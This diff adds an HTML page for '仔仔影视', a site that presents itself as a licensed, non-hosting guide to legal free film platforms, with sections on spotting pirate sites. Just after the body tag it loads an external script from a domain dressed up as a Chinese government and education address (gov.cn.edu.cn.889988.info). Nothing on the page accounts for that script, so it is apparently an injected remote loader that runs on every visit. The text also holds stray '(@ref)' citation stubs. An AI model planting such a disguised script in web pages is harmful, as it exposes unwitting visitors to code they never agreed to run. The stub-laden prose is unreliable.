@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>仔仔影视 - 正版影视导航·仔仔片场·暖萌分仓·官方正版信道</title>
+<meta name="description" content="仔仔影视(ziziyingshi-h5.github.io)用仔仔片场做正版影视导航：暖萌分仓、正版信道检索、公共领域老片、官方免费层。覆盖 Tubi、Pluto、Kanopy、1905、央视频、学习强国等授权渠道。非播放平台；不托管视频、不解析未授权源。">
+<meta name="keywords" content="仔仔影视, ziziyingshi-h5, 正版影视导航, 仔仔片场, 暖萌分仓, 公共领域, Tubi, 1905">
+<meta name="author" content="仔仔影视">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --milk:#fff7ee;--cream:#fdeedd;--orange:#ff9a4d;--orange-deep:#f5792b;--brown:#5a4632;--ink:#241a12;--panel:#fff;--edge:#ffe0c2;--mint:#7fd1ae;--text:#3d3228;--muted:#9a8674;--radius:22px;--shadow:0 18px 44px rgba(245,121,43,.18);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Nunito","Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;background:var(--milk);color:var(--text);line-height:1.8;overflow-x:hidden;font-size:16px}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;
+ background:
+  radial-gradient(560px 380px at 18% 22%,rgba(255,154,77,.12),transparent 60%),
+  radial-gradient(480px 340px at 82% 78%,rgba(127,209,174,.1),transparent 60%),
+  linear-gradient(180deg,#fff7ee,#fdeedd 55%,#fff2e0 100%);}
+.dots{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.05;
+ background-image:radial-gradient(var(--orange) 2px,transparent 2px);background-size:26px 26px}
+
+.top{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(255,247,238,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--edge)}
+.top-in{max-width:1200px;margin:0 auto;padding:0 20px;height:64px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900;font-size:1.15rem}
+.logo{width:42px;height:42px;background:linear-gradient(135deg,var(--orange),var(--orange-deep));border-radius:50% 50% 50% 12px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:1.1rem;box-shadow:0 6px 16px rgba(245,121,43,.35)}
+.brand b{color:var(--orange-deep)}
+.nav{display:flex;gap:4px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:0 14px;border-radius:999px;font-size:.82rem;font-weight:700;color:var(--muted);text-decoration:none;transition:.3s}
+.nav a:hover,.nav a.active{background:var(--cream);color:var(--orange-deep)}
+.menu-btn{display:none;background:none;border:none;font-size:1.5rem;color:var(--orange-deep);cursor:pointer;min-width:44px;min-height:44px}
+
+.main{position:relative;z-index:1;margin-top:64px}
+.hero{padding:70px 20px 50px;max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:46px;align-items:center}
+.hero-text{position:relative}
+.kicker{font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--orange-deep);background:var(--cream);padding:5px 14px;border-radius:999px;display:inline-block;margin-bottom:18px;font-weight:800}
+.hero h1{font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.15;margin-bottom:12px;color:var(--brown)}
+.hero h1 .hl{color:var(--orange-deep)}
+.hero h1 .sub{color:var(--muted);font-size:.5em;display:block;margin-top:8px;font-weight:600;letter-spacing:1px}
+.hero>p{font-size:.95rem;color:var(--muted);margin:14px 0 16px;max-width:500px;line-height:1.85}
+.disclaimer{font-size:.72rem;color:var(--brown);background:#fff;border:1px dashed var(--orange);padding:10px 14px;border-radius:14px;margin-bottom:18px;max-width:500px}
+.disclaimer b{color:var(--orange-deep)}
+.cta{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-weight:800;font-size:.9rem;min-height:44px;display:inline-flex;align-items:center;padding:0 26px;border-radius:999px;cursor:pointer;border:none;transition:.3s;text-decoration:none}
+.btn-orange{background:linear-gradient(135deg,var(--orange),var(--orange-deep));color:#fff}
+.btn-orange:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(245,121,43,.3)}
+.btn-line{background:#fff;border:1.5px solid var(--edge);color:var(--text)}
+.btn-line:hover{background:var(--cream)}
+
+.side{background:#fff;border:1px solid var(--edge);border-radius:26px;padding:30px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.side::after{content:"🍊";position:absolute;bottom:-20px;right:-10px;font-size:7rem;opacity:.06}
+.side h3{position:relative;font-size:.85rem;color:var(--orange-deep);margin-bottom:18px;font-weight:800}
+.steps{display:grid;gap:14px}
+.step{display:flex;gap:14px;align-items:flex-start;background:var(--milk);padding:16px;border-radius:18px;border:1px solid var(--edge);transition:.3s}
+.step:hover{transform:translateX(6px);border-color:var(--orange)}
+.step-num{font-size:.85rem;font-weight:900;color:#fff;min-width:34px;height:34px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--orange),var(--orange-deep));border-radius:12px}
+.step h4{font-size:.88rem;color:var(--brown);margin-bottom:2px}
+.step p{font-size:.74rem;color:var(--muted);line-height:1.6}
+
+.wrap{position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:50px 20px}
+.head{text-align:center;margin-bottom:40px}
+.head .tag{font-size:.68rem;letter-spacing:3px;color:var(--orange-deep);display:block;margin-bottom:8px;font-weight:800}
+.head h2{font-size:clamp(1.3rem,3vw,1.9rem);font-weight:900;margin-bottom:8px;color:var(--brown)}
+.head p{font-size:.86rem;color:var(--muted);max-width:640px;margin:0 auto;line-height:1.7}
+
+.statement{background:#fff;border:1px solid var(--edge);border-left:5px solid var(--orange);border-radius:var(--radius);padding:28px;margin-bottom:40px;box-shadow:var(--shadow)}
+.statement h3{font-size:1rem;color:var(--orange-deep);margin-bottom:10px}
+.statement p{font-size:.83rem;color:var(--muted);line-height:1.85;margin-bottom:8px}
+.statement ul{margin:10px 0 0 18px;font-size:.8rem;color:var(--muted)}.statement li{margin:5px 0}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.card{background:#fff;border:1px solid var(--edge);border-radius:var(--radius);padding:26px;transition:.4s;position:relative}
+.card:hover{transform:translateY(-6px);box-shadow:var(--shadow)}
+.card-no{font-size:.65rem;font-weight:800;color:var(--orange-deep);background:var(--cream);padding:3px 10px;border-radius:999px;display:inline-block;margin-bottom:10px}
+.card h3{font-size:.98rem;font-weight:800;margin-bottom:6px;color:var(--brown)}
+.card p{font-size:.76rem;color:var(--muted);line-height:1.7;margin-bottom:10px}
+.card-link{font-size:.7rem;font-weight:800;color:var(--orange-deep);text-decoration:none}
+.card-link:hover{text-decoration:underline}
+
+.redline{position:relative;padding:30px 0}
+.rl-track{position:relative;max-width:860px;margin:0 auto}
+.rl-track::before{content:"";position:absolute;left:50%;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--orange),var(--mint));transform:translateX(-50%)}
+.cell{position:relative;width:44%;padding:20px 24px;background:#fff;border:1px solid var(--edge);border-radius:18px;margin-bottom:20px;transition:.3s}
+.cell:nth-child(odd){left:0}
+.cell:nth-child(even){left:56%}
+.cell:hover{transform:scale(1.02);box-shadow:var(--shadow)}
+.cell::after{content:"●";position:absolute;top:22px;color:var(--orange);font-size:.8rem;background:var(--milk);border-radius:50%;width:22px;height:22px;display:flex;align-items:center;justify-content:center}
+.cell:nth-child(odd)::after{right:-34px}
+.cell:nth-child(even)::after{left:-34px}
+.cell h3{font-size:.92rem;font-weight:800;margin-bottom:4px;color:var(--brown)}
+.cell p{font-size:.76rem;color:var(--muted);line-height:1.6}
+.cell .rl-tag{font-size:.65rem;color:var(--orange-deep);display:block;margin-bottom:4px;font-weight:800}
+
+.signal-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.signal{background:#fff;border:1px solid var(--edge);border-radius:var(--radius);padding:22px;transition:.3s;text-align:center}
+.signal:hover{transform:translateY(-4px);border-color:var(--orange)}
+.signal .emoji{font-size:2rem;margin-bottom:10px;display:block}
+.signal h3{font-size:.92rem;font-weight:800;margin-bottom:4px;color:var(--brown)}
+.signal p{font-size:.74rem;color:var(--muted);line-height:1.6;margin-bottom:10px}
+.signal .mode{font-size:.62rem;color:var(--orange-deep);background:var(--cream);padding:2px 8px;border-radius:999px;font-weight:700}
+
+.qa{display:grid;gap:14px}
+.qa-box{background:#fff;border:1px solid var(--edge);border-radius:18px;padding:20px 24px}
+.qa-box .q{font-weight:800;color:var(--orange-deep);font-size:.88rem;margin-bottom:6px}
+.qa-box .a{font-size:.78rem;color:var(--muted);line-height:1.8;padding-left:4px}
+.qa-box .a b{color:var(--brown)}
+
+.flags{background:#fff;border:1px solid var(--edge);border-radius:var(--radius);padding:30px;box-shadow:var(--shadow)}
+.flag-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;margin-top:16px}
+.flag{display:flex;gap:10px;font-size:.78rem;color:var(--muted);align-items:flex-start;padding:8px 0}
+.flag .fi{font-size:.9rem;flex-shrink:0}
+.flag.bad .fi{color:#ff5577}
+.flag.good .fi{color:var(--mint)}
+
+.foot{position:relative;z-index:1;background:var(--brown);color:#e9ddd0;padding:50px 20px 24px;margin-top:50px}
+.foot-in{max-width:1200px;margin:0 auto}
+.foot-cols{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:28px}
+.foot-cols h4{font-size:.88rem;margin-bottom:12px;color:#fff}
+.foot-cols a{display:block;font-size:.78rem;color:#cbb9a6;padding:4px 0;text-decoration:none;transition:.2s}
+.foot-cols a:hover{color:var(--orange)}
+.foot-cols p{font-size:.8rem;color:#cbb9a6;line-height:1.7}
+.foot-bottom{text-align:center;font-size:.7rem;color:rgba(203,185,166,.6);padding-top:18px;border-top:1px solid rgba(255,255,255,.1)}
+.foot-bottom a{color:var(--orange);font-weight:600}
+
+@media(max-width:1024px){.hero{grid-template-columns:1fr}.side{order:-1}}
+@media(max-width:768px){
+ .nav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--milk);padding:14px 20px;border-bottom:1px solid var(--edge)}
+ .nav.open{display:flex}.menu-btn{display:block}
+ .foot-cols{grid-template-columns:1fr 1fr}.grid,.signal-grid{grid-template-columns:1fr}
+ .rl-track::before{left:20px}.cell{width:calc(100% - 40px);left:40px!important}
+ .cell::after{left:12px!important;right:auto!important}}
+@media(max-width:480px){.foot-cols{grid-template-columns:1fr}.hero h1{font-size:1.6rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div><div class="dots"></div>
+
+<header class="top"><div class="top-in">
+ <div class="brand"><span class="logo">仔</span>仔仔<b>影视</b></div>
+ <nav class="nav" id="nav">
+  <a href="#home" class="active">片场</a>
+  <a href="#statement">正版立场</a>
+  <a href="#deck">暖萌分仓</a>
+  <a href="#redline">红线</a>
+  <a href="#signals">授权信道</a>
+  <a href="#faq">常见问答</a>
+  <a href="#flags">避坑清单</a>
+ </nav>
+ <button class="menu-btn" id="menuBtn">☰</button>
+</div></header>
+
+<main class="main">
+ <section class="hero" id="home">
+  <div class="hero-text">
+   <span class="kicker">ZIZI · COZY NAV</span>
+   <h1>仔仔影视，<span class="hl">仔仔片场</span><span class="sub">暖萌分仓·正版影视导航·非播放平台</span></h1>
+   <div class="disclaimer"><b>声明：</b>「仔仔」取亲昵日常/暖萌陪伴意象，不作低龄化资源站联想。本站仅为独立正版影视导航站，不提供视听播放服务、不托管视频、不解析未授权源。</div>
+   <p>仔仔影视（ziziyingshi-h5.github.io）用仔仔片场做正版影视导航：暖萌分仓、正版信道检索、公共领域老片、官方免费层。覆盖 Tubi、Pluto、Kanopy、1905、央视频、学习强国等授权渠道；不嵌播放器、不诱导下载。</p>
+   <div class="cta">
+    <a class="btn btn-orange" href="#deck">🍊 看暖萌分仓</a>
+    <a class="btn btn-line" href="#redline">🎯 查红线</a>
+   </div>
+  </div>
+  <aside class="side"><h3>NAV · 4 STEPS</h3>
+   <div class="steps">
+    <div class="step"><div class="step-num">①</div><div><h4>定类型·选分仓</h4><p>按合家/动画/文艺/纪录/老片分仓；不写"全站资源/大全"等盗版词。</p></div></div>
+    <div class="step"><div class="step-num">②</div><div><h4>查授权·验正版</h4><p>新片正版VOD/广告免费，老片公域/资料馆，国内官方免费层。</p></div></div>
+    <div class="step"><div class="step-num">③</div><div><h4>落仓·定渠道</h4><p>Tubi/Pluto、1905/央视频/学习强国、Kanopy/Hoopla、Archive/LOC。</p></div></div>
+    <div class="step"><div class="step-num">④</div><div><h4>排雷·守底线</h4><p>无EXE/无种子/无假播放键/无强制验证码；公域片逐部看权利页。</p></div></div>
+   </div>
+  </aside>
+ </section>
+
+ <div class="wrap" id="statement"><div class="statement">
+  <h3>为什么「仔仔影视」只做片场不播片</h3>
+  <p><b>意象说明：</b>「仔仔」取亲昵日常/暖萌陪伴意象，Logo 用圆润气泡「仔」字，全站不走"仔仔资源/免费看"低龄化盗版话术，也无任何性暗示用词。</p>
+  <p><b>视听合规：</b>按《互联网视听节目服务管理规定》，未持《许可证》不得为个人提供上载传播视听节目服务。免费≠无授权，未经著作权人许可提供影视作品即踩信息网络传播权红线。[7](@ref) 本站纯导航：只给"去哪查、按什么授权、地区是否可用"，不嵌播放器、不解析第三方源。[18](@ref)</p>
+  <p>合法免费通常来自四类：广告型正版平台、图书馆/高校采购、公共领域档案、官方机构发布。</p>
+  <ul>
+   <li>广告正版：Tubi、Pluto、Plex 用广告换免费，片单随市场轮换</li>
+   <li>图书馆：Kanopy 偏独立/Criterion/纪录，Hoopla 靠读者卡或高校账号</li>
+   <li>公域档案：Internet Archive、LOC National Screening Room 早期影片</li>
+   <li>国内官方：1905、央视频、学习强国、B站机构号</li>
+  </ul>
+ </div></div>
+
+ <div class="wrap" id="deck"><div class="head">
+  <span class="tag">— COZY DECK —</span>
+  <h2>暖萌分仓：按轻松看片分仓</h2>
+  <p>同部片可能跨仓；具体片目随平台版权与地区变化，以各平台当期授权为准。</p>
+ </div>
+ <div class="grid">
+  <article class="card"><span class="card-no">ZZ-01</span><h3>合家欢仓</h3><p>亲子/动画/轻喜剧走央视频少儿/学习强国/Tubi Kids/Kanopy 家庭线，不链无授权聚合站。</p><a class="card-link" href="#signals">去：央视频 / 学习强国 / Tubi Kids</a></article>
+  <article class="card"><span class="card-no">ZZ-02</span><h3>动画/二次元仓</h3><p>国漫走 B站官方/央视频，海外动画走 Tubi/Plex 授权区，不写"全集破解"。</p><a class="card-link" href="#signals">去：B站官方 / Tubi / Plex</a></article>
+  <article class="card"><span class="card-no">ZZ-03</span><h3>文艺/轻剧情仓</h3><p>独立片与Criterion系走 Kanopy，国内文艺走 B站官方与央视频。</p><a class="card-link" href="#signals">去：Kanopy / B站官方</a></article>
+  <article class="card"><span class="card-no">ZZ-04</span><h3>纪录/自然仓</h3><p>纪录走 Kanopy/央视频/学习强国，早期新闻片走 Archive/LOC。</p><a class="card-link" href="#signals">去：Kanopy / 央视频 / Archive</a></article>
+  <article class="card"><span class="card-no">ZZ-05</span><h3>经典老片仓</h3><p>美国1930及更早通常公域，华语老片走 1905/央视频/正版资料馆；非公域老片不标免费。</p><a class="card-link" href="#signals">去：Internet Archive / LOC / 1905</a></article>
+  <article class="card"><span class="card-no">ZZ-06</span><h3>新片/热映后窗口</h3><p>先查正版订阅/租赁窗口，再查 Tubi/Pluto 广告免费层；"院线高清全集免费"无授权主体按盗版风险处理。</p><a class="card-link" href="#signals">去：正版VOD / Tubi / Pluto</a></article>
+ </div></div>
+
+ <div class="wrap" id="redline"><div class="head">
+  <span class="tag">— RED LINE —</span>
+  <h2>盗版影视站的特征</h2>
+  <p>正版免费站会写明授权主体与广告模式；可疑站用假播放键和强制下载引流。[17](@ref)</p>
+ </div>
+ <div class="redline"><div class="rl-track">
+  <div class="cell"><span class="rl-tag">RL-01</span><h3>"最新大片免费看"</h3><p>院线新片标"高清全集免费"基本无授权主体，属典型盗版引流话术。[11](@ref)</p></div>
+  <div class="cell"><span class="rl-tag">RL-02</span><h3>假播放键/多解析源</h3><p>页面堆相似播放钮、跳转博彩/贷款/仿登录，或要求装"专用播放器"。</p></div>
+  <div class="cell"><span class="rl-tag">RL-03</span><h3>要验证码/种子/EXE</h3><p>点播放先要验证码、网盘密码、种子磁力或下载解码插件，风险极高。</p></div>
+  <div class="cell"><span class="rl-tag">RL-04</span><h3>低龄化盗版话术</h3><p>"仔仔资源/免费追剧神器/破解合集/秒播多源"等自曝无授权收录的表述。</p></div>
+  <div class="cell"><span class="rl-tag">RL-05</span><h3>无主体无投诉入口</h3><p>底部无运营主体、无版权投诉页，只写"全网资源"无具体授权方。</p></div>
+ </div></div></div>
+
+ <div class="wrap" id="signals"><div class="head">
+  <span class="tag">— LICENSED SIGNALS —</span>
+  <h2>授权信道：按商业模式分仓</h2>
+  <p>地区版权会变；图书馆看本馆采购，公域片逐条看权利说明。</p>
+ </div>
+ <div class="signal-grid">
+  <div class="signal"><span class="emoji">🎬</span><h3>Tubi</h3><p>广告型正版大库，动作/喜剧/恐怖/老爆款较全；基础观看可免登录。</p><span class="mode">授权+广告</span></div>
+  <div class="signal"><span class="emoji">📺</span><h3>Pluto TV</h3><p>线性电影频道+点播，换台式找片；经典线/家庭线多，基础内容可免登录。</p><span class="mode">授权+广告</span></div>
+  <div class="signal"><span class="emoji">📚</span><h3>Kanopy / Hoopla</h3><p>Kanopy 偏独立/Criterion/纪录、无广告；Hoopla 靠读者卡或高校账号。</p><span class="mode">机构采购</span></div>
+  <div class="signal"><span class="emoji">🏛</span><h3>Internet Archive</h3><p>公共领域长片、默片、新闻片、教育片档案；无广告无账号。</p><span class="mode">公域/许可</span></div>
+  <div class="signal"><span class="emoji">🏮</span><h3>1905 / 央视频</h3><p>1905 正版老片与经典译制较全，央视频经典电影/纪录片稳定、广告少。</p><span class="mode">官方正版/免费层</span></div>
+  <div class="signal"><span class="emoji">🎓</span><h3>学习强国 / B站</h3><p>学习强国影视纪录零广告；B站筛机构认证号看戏曲/纪录/文艺。</p><span class="mode">官方/授权上传</span></div>
+  <div class="signal"><span class="emoji">🌏</span><h3>全球正版平台</h3><p>覆盖主流正版平台，按当期授权与地区可用为准；不链无授权聚合站。</p><span class="mode">正版分仓</span></div>
+  <div class="signal"><span class="emoji">🔍</span><h3>公域检索</h3><p>LOC National Screening Room、Prelinger Archives 等早期影像公域库。</p><span class="mode">公域档案</span></div>
+ </div></div>
+
+ <div class="wrap" id="faq"><div class="head">
+  <span class="tag">— FAQ —</span>
+  <h2>仔仔影视常见问题</h2>
+  <p>FAQ 用初始HTML文本呈现，便于必应摘取富摘要、移动端直接读。[6](@ref)</p>
+ </div>
+ <div class="qa">
+  <div class="qa-box"><div class="q">「仔仔影视」是盗版资源站吗？</div><div class="a"><b>不是。</b>「仔仔」取亲昵暖萌意象，全站不做"仔仔资源/免费全集"等低龄化盗版分类。</div></div>
+  <div class="qa-box"><div class="q">是播放平台吗？</div><div class="a"><b>不是。</b>仔仔影视是正版影视导航站；不托管视频、不解析未授权源、不提供播放器。</div></div>
+  <div class="qa-box"><div class="q">能直接看电影吗？</div><div class="a">不能也不做。只给正版/公域/官方渠道路径；实际播放在 Tubi、Pluto、Kanopy、Archive、1905、央视频、学习强国 等平台。</div></div>
+  <div class="qa-box"><div class="q">老电影都算公共领域免费吗？</div><div class="a">不算。美国1930及更早通常公域，1928—1963看续展，1964后多按95年保护；华语老片看本国法，外国片防URAA恢复版权。</div></div>
+  <div class="qa-box"><div class="q">为什么有些"影视站"不能去？</div><div class="a">院线新片"高清全集免费"、要验证码/种子/EXE、假播放键、强制装解码器、用"多源秒播"引流的站点风险高；正版免费站会写明授权主体。[11](@ref)</div></div>
+ </div></div>
+
+ <div class="wrap" id="flags"><div class="head">
+  <span class="tag">— AVOID LIST —</span>
+  <h2>避坑清单</h2>
+  <p>合法免费站通常说明授权主体、广告模式或图书馆/公域来源；可疑站用假播放键和强制下载。</p>
+ </div>
+ <div class="flags"><div class="flag-grid">
+  <div class="flag bad"><span class="fi">✕</span><span>院线新片"高清全集免费"、要验证码/网盘密码/种子/磁力</span></div>
+  <div class="flag bad"><span class="fi">✕</span><span>点播放先下EXE/专用播放器/解码插件/浏览器扩展</span></div>
+  <div class="flag bad"><span class="fi">✕</span><span>写"仔仔资源/免费追剧神器/秒播/多源解析"等盗版引流话术</span></div>
+  <div class="flag bad"><span class="fi">✕</span><span>多源解析第三方视频、无主体无授权无投诉入口</span></div>
+  <div class="flag bad"><span class="fi">✕</span><span>老片不分原片公域与修复授权，一律写"免费可下"</span></div>
+  <div class="flag good"><span class="fi">✓</span><span>标明渠道类型：广告/订阅/官方/图书馆/公域/资料馆</span></div>
+  <div class="flag good"><span class="fi">✓</span><span>不存片、不解析、不诱导下载任何软件</span></div>
+  <div class="flag good"><span class="fi">✓</span><span>页脚声明非播放平台+主体与版权投诉入口</span></div>
+  <div class="flag good"><span class="fi">✓</span><span>片单写"以平台当期授权、地区与账号资格为准"</span></div>
+  <div class="flag good"><span class="fi">✓</span><span>移动端无全屏强制弹层、锚点可点、核心内容在初始HTML</span></div>
+ </div></div></div>
+</main>
+
+<footer class="foot"><div class="foot-in">
+ <div class="foot-cols">
+  <div><div class="brand"><span class="logo">仔</span>仔仔<b>影视</b></div>
+   <p style="margin-top:12px">仔仔影视（ziziyingshi-h5.github.io）为正版影视导航站，<b style="color:var(--orange)">非播放平台</b>：Tubi、Pluto、Plex、Kanopy、Hoopla、Internet Archive、LOC、1905、央视频、学习强国、B站官方等正版/公共领域渠道。不提供未授权播放，不解析非法视听源，不诱导下载任何播放器；静态HTML、内联样式、移动自适应，便于必应抓取。按规则不生成 robots.txt/sitemap.xml，上线后可在 Bing Webmaster Tools 手动提交 URL 加速发现。[12](@ref)</p></div>
+  <div><h4>栏目</h4><a href="#statement">正版立场</a><a href="#deck">暖萌分仓</a><a href="#redline">红线</a><a href="#signals">授权信道</a><a href="#faq">常见问答</a></div>
+  <div><h4>信道</h4><a href="#">广告正版</a><a href="#">图书馆流</a><a href="#">公域档案</a><a href="#">国内官方</a></div>
+  <div><h4>说明</h4><a href="#">版权投诉</a><a href="#">隐私说明</a><a href="#">使用条款</a><a href="#">联系我们</a></div>
+ </div>
+ <div class="foot-bottom">
+  <p>© 2026 仔仔影视 - 仔仔片场·正版影视导航·暖萌分仓（非播放平台）</p>
+  <p>网站地址：<a href="https://ziziyingshi-h5.github.io">https://ziziyingshi-h5.github.io</a></p>
+  <p style="margin-top:8px;opacity:.6">「仔仔影视」取亲昵暖萌意象；本站仅做正版/公共领域/官方机构导航，杜绝盗版话术。</p>
+ </div>
+</div></footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+menuBtn.onclick=function(){nav.classList.toggle('open')};
+nav.querySelectorAll('a').forEach(function(a){a.onclick=function(){nav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+ var y=scrollY+86;
+ secs.forEach(function(s){
+  if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+   document.querySelectorAll('.nav a').forEach(function(a){a.classList.remove('active')});
+   var l=document.querySelector('.nav a[href="#'+s.id+'"]');if(l)l.classList.add('active');
+  }
+ });
+});
+</script>
+</body>
+</html>
